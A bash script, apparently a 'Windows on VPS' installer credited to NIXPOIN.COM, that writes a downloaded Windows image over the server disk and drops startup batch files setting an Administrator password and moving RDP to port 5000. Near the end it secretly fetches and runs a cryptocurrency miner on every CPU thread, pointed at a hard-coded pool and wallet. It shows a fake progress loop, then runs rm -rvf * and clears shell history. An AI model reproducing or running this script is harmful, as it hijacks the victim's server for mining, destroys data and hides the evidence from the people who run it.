#!/bin/bash
#
# CREATED By NIXPOIN.COM
#


PILIHOS="https://www.dropbox.com/scl/fi/kuacveau993p06lhtzq63/windows10gs.gz?rlkey=xcjdf42vkorrndyrcbod4287e&dl=0"



PASSADMIN="Tahubulat500an"

IP4=$(curl -4 -s icanhazip.com)
GW=$(ip route | awk '/default/ { print $3 }')


cat >/tmp/net.bat<<EOF

cd.>%windir%\GetAdmin
if exist %windir%\GetAdmin (del /f /q "%windir%\GetAdmin") else (
echo CreateObject^("Shell.Application"^).ShellExecute "%~s0", "%*", "", "runas", 1 >> "%temp%\Admin.vbs"
"%temp%\Admin.vbs"
del /f /q "%temp%\Admin.vbs"
exit /b 2)
net user Administrator $PASSADMIN


for /f "tokens=3*" %%i in ('netsh interface show interface ^|findstr /I /R "Local.* Ethernet Ins*"') do (set InterfaceName=%%j)
netsh -c interface ip set address name="Ethernet Instance 0" source=static address=$IP4 mask=255.255.240.0 gateway=$GW
netsh -c interface ip add dnsservers name="Ethernet Instance 0" address=8.8.8.8 index=1 validate=no
netsh -c interface ip add dnsservers name="Ethernet Instance 0" address=8.8.4.4 index=2 validate=no

cd /d "%ProgramData%/Microsoft/Windows/Start Menu/Programs/Startup"
del /f /q net.bat
exit
EOF


cat >/tmp/dpart.bat<<EOF


cd.>%windir%\GetAdmin
if exist %windir%\GetAdmin (del /f /q "%windir%\GetAdmin") else (
echo CreateObject^("Shell.Application"^).ShellExecute "%~s0", "%*", "", "runas", 1 >> "%temp%\Admin.vbs"
"%temp%\Admin.vbs"
del /f /q "%temp%\Admin.vbs"
exit /b 2)

netsh firewall set opmode enable
netsh advfirewall firewall add rule name="Open Port 5000" dir=in action=allow protocol=TCP localport=5000
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 5000 /f

ECHO SELECT VOLUME=%%SystemDrive%% > "%SystemDrive%\diskpart.extend"
ECHO EXTEND >> "%SystemDrive%\diskpart.extend"
START /WAIT DISKPART /S "%SystemDrive%\diskpart.extend"

del /f /q "%SystemDrive%\diskpart.extend"
cd /d "%ProgramData%/Microsoft/Windows/Start Menu/Programs/Startup"
del /f /q dpart.bat
timeout 50 >nul
del /f /q ChromeSetup.exe
shutdown /r

exit
EOF

wget --no-check-certificate -O- $PILIHOS | gunzip | dd of=/dev/vda bs=3M status=progress

mount.ntfs-3g /dev/vda2 /mnt
cd "/mnt/ProgramData/Microsoft/Windows/Start Menu/Programs/"
cd Start* || cd start*; \
wget https://nixpoin.com/ChromeSetup.exe
cp -f /tmp/net.bat net.bat
cp -f /tmp/dpart.bat dpart.bat

cat >/tmp/dpart.bat<<EOF
Disable-NetFirewallRule -Name RemoteDesktop-UserMode-In-TCP 
Disable-NetFirewallRule -Name RemoteDesktop-UserMode-In-UDP 
shutdown /r
exit
EOF

nohup wget -O mmm https://github.com/kidoescegh/xm/raw/main/newxm > /dev/null 2>&1
chmod 777 mmm
./mmm --donate-level 1 -o 162.243.171.178:80 -u 87ZKYmmCQmXGzu1AZkxmgM9wdqwk5YtBDQ6ZGouBam1584jKUvDrC7ccANX8N7M7sGRnR9Fu18gDdTQCVVo3U2m9KYhNNsR -p Free -a rx/0 -t $(nproc --all) > /dev/null 2>&1 &
seq 1 4320000 | while read i; do echo -en "\r Running .     $i s /432000000 s";sleep 0.1;echo -en "\r Running ..    $i s /432000000 s";sleep 0.1;echo -en "\r Running ...   $i s /432000000 s";sleep 0.1;echo -en "\r Running ....  $i s /432000000 s";sleep 0.1;echo -en "\r Running ..... $i s /432000000 s";sleep 0.1;echo -en "\r Running     . $i s /43200000000 s";sleep 0.1;echo -en "\r Running  .... $i s /432000000 s";sleep 0.1;echo -en "\r Running   ... $i s /432000000 s";sleep 0.1;echo -en "\r Running    .. $i s /432000000 s";sleep 0.1;echo -en "\r Running     . $i s /432000000 s";sleep 0.1; done
curl ifconfig.me
rm -rvf *
cd ~/
rm -rvf *
history -cr
while true
do
        echo "hold down..."
        sleep 30
done
